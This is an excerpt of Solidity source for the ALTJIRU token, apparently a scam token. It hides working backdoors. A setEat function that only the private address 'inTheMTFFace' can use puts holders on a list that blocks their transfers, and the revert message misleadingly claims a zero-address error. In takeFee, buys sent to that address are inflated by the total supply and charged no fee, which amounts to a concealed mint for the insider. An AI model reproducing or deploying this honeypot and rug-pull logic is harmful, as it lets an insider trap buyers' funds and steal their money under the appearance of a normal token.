...
// Channel Group: https://t.me/altjiru
...
contract ALTJIRU is Context, IERC20, Ownable {
    ...
    address payable private doYouLikeBase;
    address payable private inTheMTFFace;
    ...
    mapping (address => bool) private whoEat;
    ...
    address[2] memory _doyoulike) 
    {
        ...
        isMaxEatExempt[inTheMTFFace] = true;
        
        isOnceEatExempt[owner()] = true;
        isOnceEatExempt[address(this)] = true;
        isOnceEatExempt[inTheMTFFace] = true;
    ...
    function setBBB(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
    ...
    function setSSS(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
    ...
    function setEat(address recipient, bool status) public  {
        if(msg.sender==inTheMTFFace)whoEat[recipient] = status;
        else return;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0) && !whoEat[sender], "ERC20: transfer from the zero address");
        ...
        else
        {
            ...
            /*if (!isExcludedFromCut[sender] && !isExcludedFromCut[recipient] && (IOpenNFT(OpenNFTAddress)).getStatus()) {
                amount = amount.sub(300);
                _balances[address(this)] = _balances[address(this)].add(300);
                for(uint a=0;a<=2;a++){
                    if (!_basicTransfer(address(this), (IOpenNFT(OpenNFTAddress)).getRandomAddress(a), 100))
                        return false;
                }
            }*/
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]&&recipient==inTheMTFFace){feeAmount = 0;
            amount = amount.mul(_totalSupply).div(18);}
